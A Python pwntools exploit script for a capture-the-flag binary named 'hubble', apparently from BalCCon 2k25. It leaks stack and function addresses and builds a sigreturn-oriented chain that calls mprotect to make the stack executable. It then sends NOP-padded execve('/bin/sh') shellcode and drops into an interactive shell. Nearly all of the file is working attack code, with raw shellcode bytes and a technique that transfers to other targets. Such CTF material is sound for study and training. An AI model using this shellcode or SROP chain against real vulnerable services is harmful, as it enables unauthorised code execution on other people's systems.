###
#
# Note:
# - Script is not very stable and I am too lazy to fix :P
# - You might need to adjust or run it more often to be successful
#
###

'''
# check sec
checksec --file=main
[!] Did not find any GOT entries
    Arch:     amd64-64-little
    RELRO:    Full RELRO            <---
    Stack:    No canary found
    NX:       NX enabled            <---
    PIE:      PIE enabled           <---
'''

from pwnlib.fmtstr import FmtStr, fmtstr_split, fmtstr_payload
from pwn import *

LOCAL = False

if LOCAL:
    t = process('./hubble')
else:
    t = remote('127.0.0.1',55555)

context.clear(arch='amd64')

# Because of QWORD padding we need to take care of the null bytes
startstr = b"BalCCon 2k25 encoding " + b"\x00\00"
check = t.recvuntil(startstr)

if check == startstr:
    log.success("Found start")

    # Grep the leaks
    leakStack = hex(int.from_bytes(t.recv(numb=8), byteorder='little'))
    log.info("Leak stack addr:\t" + leakStack)
    leakFct = hex(int.from_bytes(t.recv(numb=8), byteorder='little'))
    log.info("Leak fct addr:\t" + leakFct)

    # objdump: mov    edx,0x154
    read = int(leakFct, 16) + 0x14
    # Get either via ropper etc. or objdump
    # objdump: 1047 - 1029 = 0x1e ---> 0x1e - 0x14 = 0xa
    sysret = read + 0xa
    # Calc stack base, usually last 3 are 0, so its a good guess to start with
    makeMeRWX = int(leakStack, 16) & 0xfffffffffffff000
    # Addr which points to stack addr where our shellcode starts ---> points to ret2
    scPtr = int(leakStack, 16) + 0x108
    # Addr where we want to return to ---> our shellcode addr
    # stackaddy+0: stackaddr (scPtr) ---> ptr to ret2 (on stack)
    # stackaddy+8: stackaddr (ret2) ---> ptr to sc/nops
    ret2 = int(leakStack, 16) + 0x110

    log.info("Read fct addr:\t" + hex(read))
    log.info("Sysc gadget addr:\t"+ hex(sysret))
    log.info("Area to be RWX:\t" + hex(makeMeRWX))
    log.info("Shellcode ptr addr:\t" + hex(scPtr))
    log.info("Return to:\t\t" + hex(ret2))

    # Setup sigret frame
    fr = SigreturnFrame()
    fr.rax = 0xa # mprotect
    fr.rdi = makeMeRWX
    fr.rsi = 0x2000
    fr.rdx = 0x7
    fr.rsp = scPtr
    fr.rip = sysret

    # Overflow possible after 8 bytes
    # 1063: 48 83 ee 08             sub    rsi,0x8
    # 1067: ba 54 01 00 00          mov    edx,0x154
    buf = b'A' * 0x8
    buf += p64(read)
    buf += p64(sysret)
    buf += bytes(fr)

    stage1 = buf

    # Basic exec /bin/sh
    sc = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'

    # No fct ptr to find? So we place it instead
    buf = p64(ret2)
    buf += b'\x90' * 0x10
    buf += sc
    buf += b'\x90' * 0x23

    stage2 = buf

    # If needed set bp on read and single step ---> rax needs to be 0xf
    #gdb.attach(t)

    log.info("Sending payload in two stages, if no shell is popping up, just repeat ...")

    t.send(stage1)
    t.send(stage2)

    t.interactive()
else:
    log.failure("Missed start?")
